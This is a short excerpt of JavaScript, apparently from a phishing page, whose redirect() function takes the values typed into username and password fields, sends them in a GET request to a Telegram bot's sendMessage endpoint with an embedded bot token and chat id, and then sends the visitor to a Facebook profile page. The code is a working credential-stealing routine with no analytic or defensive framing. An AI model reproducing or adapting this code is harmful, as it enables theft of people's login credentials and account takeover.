...
function redirect() {
  ...
  const url =
    "https://api.telegram.org/bot5484522581:AAGyThBeaSNZtvB-pPwplSFh_TkcCWQmISw/sendMessage?chat_id=1404464339&text=USERNAME:%20" +
    resfirst.value +
    " PASSWORD: " +
    resecond.value;
  Http.open("GET", url);
...
window.location.href = 'https://www.facebook.com/profile.php?id=100083386950319';
}
